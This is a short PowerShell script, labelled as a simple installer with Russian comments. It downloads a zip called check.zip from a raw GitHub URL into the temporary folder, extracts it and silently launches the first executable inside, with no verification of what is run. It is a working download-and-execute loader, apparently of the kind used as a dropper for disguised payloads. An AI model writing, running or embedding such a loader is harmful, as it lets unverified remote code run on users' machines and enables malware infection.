# =============================================
# Простой Installer (без пароля)
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing

Write-Host "[+] Распаковываем архив..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

# Простая распаковка
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
    Write-Host "[+] Успешно распаковано" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка распаковки" -ForegroundColor Red
}

# Автоматический запуск первого .exe
$ExeFiles = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($ExeFiles) {
    Write-Host "[+] Запускаем: $($ExeFiles.Name)" -ForegroundColor Green
    Start-Process $ExeFiles.FullName
} else {
    Write-Host "[-] .exe не найден, открываю папку..." -ForegroundColor Yellow
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
